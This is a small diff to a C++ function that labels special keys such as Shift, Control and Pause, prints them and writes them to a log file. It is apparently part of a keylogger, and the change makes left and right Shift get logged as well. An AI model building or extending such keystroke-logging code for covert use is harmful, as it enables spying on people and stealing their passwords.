@@ -122,13 +122,12 @@ bool specialKeys(int specialKey)
 			return true;
 
 		case VK_SHIFT:
+		case VK_LSHIFT:
+		case VK_RSHIFT:
 			cout << "[SHIFT]";
 			writeToFile("[SHIFT]");
 			return true;
-		case VK_LSHIFT:
-		case VK_RSHIFT:
-			return true;
-
+			
 		case VK_CONTROL:
 			cout << "[CONTROL]";
 			writeToFile("[CONTROL]");
@@ -144,8 +143,6 @@ bool specialKeys(int specialKey)
 		case VK_LMENU:
 		case VK_RMENU:
 			return true;
-
-
 
 		case VK_PAUSE:
 			cout << "[PAUSE]";
